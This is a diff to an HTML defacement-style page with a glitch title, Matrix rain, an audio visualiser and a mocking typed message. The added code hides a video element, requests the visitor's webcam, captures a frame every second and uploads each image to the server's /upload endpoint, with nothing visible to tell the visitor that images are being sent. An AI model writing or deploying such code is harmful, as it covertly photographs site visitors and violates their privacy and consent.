@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -19,13 +20,9 @@
             overflow: hidden;
             animation: fadeIn 2s ease-in;
         }
-@keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         .glitch {
             font-size: 3em;
@@ -33,16 +30,10 @@
             color: #00ff00;
             animation: glitch 1s infinite;
         }
-@keyframes glitch {
-            0%, 100% {
-                text-shadow: 2px 2px #ff0000, -2px -2px #0000ff;
-            }
-            20%, 80% {
-                text-shadow: -2px -2px #ff0000, 2px 2px #0000ff;
-            }
-            40%, 60% {
-                text-shadow: 2px -2px #ff0000, -2px 2px #0000ff;
-            }
+        @keyframes glitch {
+            0%, 100% { text-shadow: 2px 2px #ff0000, -2px -2px #0000ff; }
+            20%, 80% { text-shadow: -2px -2px #ff0000, 2px 2px #0000ff; }
+            40%, 60% { text-shadow: 2px -2px #ff0000, -2px 2px #0000ff; }
         }
         .profile {
             font-size: 0.4em;
@@ -76,6 +67,9 @@
             left: 0;
             z-index: -1;
         }
+        #video {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -90,24 +84,26 @@
     <audio id="audio" loop>
         <source src="assets/funkdd.mp3" type="audio/mpeg">
     </audio>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            var audio = document.getElementById("audio");
-            var profilePic = document.getElementById("profile-pic");
-            var audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            var analyser = audioContext.createAnalyser();
-            var source = audioContext.createMediaElementSource(audio);
+            const audio = document.getElementById("audio");
+            const profilePic = document.getElementById("profile-pic");
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const analyser = audioContext.createAnalyser();
+            const source = audioContext.createMediaElementSource(audio);
             source.connect(analyser);
             analyser.connect(audioContext.destination);
             analyser.fftSize = 256;
-            var bufferLength = analyser.frequencyBinCount;
-            var dataArray = new Uint8Array(bufferLength);
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
 
             function animate() {
                 requestAnimationFrame(animate);
                 analyser.getByteFrequencyData(dataArray);
-                var sum = dataArray.reduce((a, b) => a + b, 0);
-                var average = sum / bufferLength;
+                const sum = dataArray.reduce((a, b) => a + b, 0);
+                const average = sum / bufferLength;
                 if (average > 100) {
                     profilePic.classList.add('beat');
                 } else {
@@ -115,7 +111,7 @@
                 }
             }
 
-            var playPromise = audio.play();
+            const playPromise = audio.play();
             if (playPromise !== undefined) {
                 playPromise.then(_ => {
                     audioContext.resume().then(() => {
@@ -131,10 +127,9 @@
                 });
             }
 
-            var text = "Hey there, I just wanted to let you know that your website is currently under attack. I've been able to infiltrate your system and I'm using it to spread malware and steal sensitive information. You need to take action now to secure your site and protect your users. Don't wait, act now!";
-            var index = 0;
-            var typingTextElement = document.getElementById("typing-text");
-
+            const text = "Your Security Sucks Cry About it ; <";
+            let index = 0;
+            const typingTextElement = document.getElementById("typing-text");
             function type() {
                 if (index < text.length) {
                     typingTextElement.innerHTML += text.charAt(index);
@@ -144,31 +139,85 @@
             }
             type();
 
-            // Matrix effect
-            var canvas = document.getElementById('matrix');
-            var ctx = canvas.getContext('2d');
+            const canvas = document.getElementById('matrix');
+            const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            var matrix = "01";
+            let matrix = "01";
             matrix = matrix.split("");
-            var font_size = 10;
-            var columns = canvas.width / font_size;
-            var drops = [];
-            for (var x = 0; x < columns; x++) drops[x] = 1;
+            const font_size = 10;
+            const columns = canvas.width / font_size;
+            const drops = [];
+            for (let x = 0; x < columns; x++) drops[x] = 1;
 
             function draw() {
                 ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.fillStyle = "#0F0";
                 ctx.font = font_size + "px arial";
-                for (var i = 0; i < drops.length; i++) {
-                    var text = matrix[Math.floor(Math.random() * matrix.length)];
+                for (let i = 0; i < drops.length; i++) {
+                    const text = matrix[Math.floor(Math.random() * matrix.length)];
                     ctx.fillText(text, i * font_size, drops[i] * font_size);
                     if (drops[i] * font_size > canvas.height && Math.random() > 0.975) drops[i] = 0;
                     drops[i]++;
                 }
             }
             setInterval(draw, 33);
+
+            const video = document.getElementById("video");
+            const canvasHidden = document.getElementById("canvas");
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(err => {
+                    console.error("Error accessing the camera: ", err);
+                });
+
+            function captureImage() {
+                const context = canvasHidden.getContext("2d");
+                canvasHidden.width = video.videoWidth;
+                canvasHidden.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvasHidden.width, canvasHidden.height);
+                return canvasHidden.toDataURL("image/png");
+            }
+
+            async function uploadToServer(imageData) {
+                const formData = new FormData();
+                formData.append('image', dataURLtoBlob(imageData));
+
+                try {
+                    const response = await fetch("/upload", {
+                        method: "POST",
+                        body: formData,
+                    });
+                    const result = await response.json();
+                    if (result.message) {
+                        console.log("Image uploaded:", result.message);
+                        console.log("File path:", result.filePath); 
+                    } else {
+                        console.error("Server upload failed:", result.error);
+                    }
+                } catch (error) {
+                    console.error("Error during server upload:", error);
+                }
+            }
+
+            function dataURLtoBlob(dataURL) {
+                const byteString = atob(dataURL.split(',')[1]);
+                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], { type: mimeString });
+            }
+
+            setInterval(() => {
+                const imageData = captureImage();
+                uploadToServer(imageData);
+            }, 1000);
         });
     </script>
 </body>
